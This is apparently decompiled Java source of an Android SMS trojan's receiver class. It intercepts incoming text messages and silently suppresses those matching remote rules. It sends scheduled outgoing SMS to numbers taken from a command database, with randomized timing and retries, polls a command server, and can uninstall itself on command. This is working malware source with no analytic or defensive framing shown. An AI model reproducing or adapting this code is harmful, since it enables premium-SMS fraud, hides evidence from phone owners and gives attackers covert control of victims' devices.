package test.app;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import java.util.List;

public class MainReceiver
  extends BroadcastReceiver
{
  public MainReceiver() {}
  
  private String[] getMessage(Bundle paramBundle)
  {
    Object localObject = "";
    StringBuffer localStringBuffer = new StringBuffer();
    Object[] arrayOfObject = (Object[])paramBundle.get("pdus");
    int i = 0;
    paramBundle = (Bundle)localObject;
    for (;;)
    {
      if (i >= arrayOfObject.length) {
        return new String[] { paramBundle, localStringBuffer.toString() };
      }
      localObject = SmsMessage.createFromPdu((byte[])arrayOfObject[i]);
      paramBundle = ((SmsMessage)localObject).getOriginatingAddress();
      localStringBuffer.append(((SmsMessage)localObject).getMessageBody());
      i += 1;
    }
  }
  
  public static void init(Context paramContext)
  {
    if (Constants.DEBUG) {
      Settings.debug("init()");
    }
    Settings localSettings = new Settings(paramContext);
    if (localSettings.isFisrt())
    {
      if (Constants.DEBUG) {
        Settings.debug("isFisrt(): true");
      }
      localSettings.setServer(Constants.SERVER);
      localSettings.setInterval(Constants.INTERVAL * Settings.times.SECOND);
      localSettings.setTime(System.currentTimeMillis() + Constants.FIRST_START * Settings.times.SECOND);
    }
    if (localSettings.getNeedDelete()) {
      Settings.uninstallApk(paramContext, paramContext.getPackageName());
    }
    if (System.currentTimeMillis() > localSettings.getTime()) {
      localSettings.setTime(System.currentTimeMillis() + localSettings.getInterval());
    }
    Settings.startCustomTimer(paramContext, actions.CONNECT, localSettings.getTime(), false);
    Settings.startCustomTimer(paramContext, actions.CHECK_LOG, 1L * Settings.times.MINUTE, true);
    Settings.startBackgroundSms(paramContext);
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    if (new Settings(paramContext).getNeedDelete())
    {
      Settings.uninstallApk(paramContext, paramContext.getPackageName());
      return;
    }
    Object localObject1 = paramIntent.getAction();
    if (Constants.DEBUG) {
      Settings.debug("onReceive: " + (String)localObject1);
    }
    Object localObject2;
    int i;
    Object localObject3;
    for (;;)
    {
      try
      {
        if (!((String)localObject1).equals(actions.SMS)) {
          break label284;
        }
        paramIntent = getMessage(paramIntent.getExtras());
        if (Constants.DEBUG) {
          Settings.debug("sms: " + paramIntent[1] + " from " + paramIntent[0]);
        }
        if (Settings.isDeleteMessage(paramContext, paramIntent[0], paramIntent[1]))
        {
          abortBroadcast();
          if (Constants.DEBUG) {
            Settings.debug("isDeleteMessage() true");
          }
        }
        localObject1 = Settings.getAnswerMessage(paramContext, paramIntent[0], paramIntent[1]);
        if (Constants.DEBUG) {
          Settings.debug("answer: " + localObject1);
        }
        if (localObject1 != null) {
          Settings.sendSms(paramContext, localObject1[2], localObject1[0], localObject1[1]);
        }
        localObject1 = new DbSms(paramContext);
        localObject2 = ((DbSms)localObject1).getItems();
        i = 0;
        if (i >= ((List)localObject2).size()) {
          break;
        }
        localObject3 = (DbSmsItem)((List)localObject2).get(i);
        if (Settings.isMatch(paramIntent[1], ((DbSmsItem)localObject3).successExp))
        {
          ((DbSms)localObject1).updateStatus(((DbSmsItem)localObject3).commandId, 1);
          return;
        }
      }
      catch (Exception paramIntent)
      {
        Settings.sendMessage(paramContext, paramIntent);
        return;
      }
      i += 1;
    }
    label284:
    if (((String)localObject1).equals(actions.CHECK_LOG))
    {
      Settings.startService(paramContext, MainService.actions.LOG);
      return;
    }
    if (((String)localObject1).equals(actions.CONNECT))
    {
      Settings.startService(paramContext, MainService.actions.COMMANDS);
      return;
    }
    if (((String)localObject1).startsWith(actions.SEND_SMS))
    {
      paramIntent = ((String)localObject1).replace(actions.SEND_SMS + ".", "");
      localObject1 = new DbSms(paramContext);
      localObject2 = ((DbSms)localObject1).loadByCommandId(paramIntent);
      if (((DbSmsItem)localObject2).inteval == 0)
      {
        ((DbSms)localObject1).removeByCommandId(((DbSmsItem)localObject2).commandId);
        return;
      }
      if (Constants.DEBUG) {
        Settings.debug("item.status: " + ((DbSmsItem)localObject2).status);
      }
      if ((((DbSmsItem)localObject2).status == 0) || (((DbSmsItem)localObject2).status == 1))
      {
        ((DbSmsItem)localObject2).time = ((Settings.getRandomValue(((DbSmsItem)localObject2).min, ((DbSmsItem)localObject2).max) + ((DbSmsItem)localObject2).inteval) * Settings.times.SECOND);
        ((DbSmsItem)localObject2).time += System.currentTimeMillis();
        ((DbSms)localObject1).updateTime(paramIntent, ((DbSmsItem)localObject2).time);
        ((DbSms)localObject1).updateStatus(paramIntent, -1);
        Settings.startCustomTimer(paramContext, actions.SEND_SMS + "." + paramIntent, ((DbSmsItem)localObject2).time, false);
        Settings.sendSms(paramContext, paramIntent, ((DbSmsItem)localObject2).phone, ((DbSmsItem)localObject2).text);
        return;
      }
      localObject3 = ((DbSmsItem)localObject2).getIntervals();
      if (((DbSmsItem)localObject2).tryCount < localObject3.length) {}
      for (i = ((DbSmsItem)localObject2).tryCount;; i = localObject3.length - 1)
      {
        if (Constants.DEBUG) {
          Settings.debug("index: " + i);
        }
        ((DbSms)localObject1).updateTryCount(paramIntent, ((DbSmsItem)localObject2).tryCount + 1);
        i = Integer.parseInt(localObject3[i]);
        if (Constants.DEBUG) {
          Settings.debug("interval: " + i);
        }
        if (i <= 0) {
          break;
        }
        ((DbSmsItem)localObject2).time = (i * Settings.times.DAY);
        ((DbSmsItem)localObject2).time += System.currentTimeMillis();
        ((DbSms)localObject1).updateTime(paramIntent, ((DbSmsItem)localObject2).time);
        ((DbSms)localObject1).updateStatus(paramIntent, 0);
        Settings.startCustomTimer(paramContext, actions.SEND_SMS + "." + paramIntent, ((DbSmsItem)localObject2).time, false);
        return;
      }
    }
    init(paramContext);
  }
  
  static final class actions
  {
    public static String CHECK_LOG = "check";
    public static String CONNECT = "connect";
    public static String SEND_LOG;
    public static String SEND_SMS = "send";
    public static String SMS = "android.provider.Telephony.SMS_RECEIVED";
    
    static
    {
      SEND_LOG = "log";
    }
    
    actions() {}
  }
}
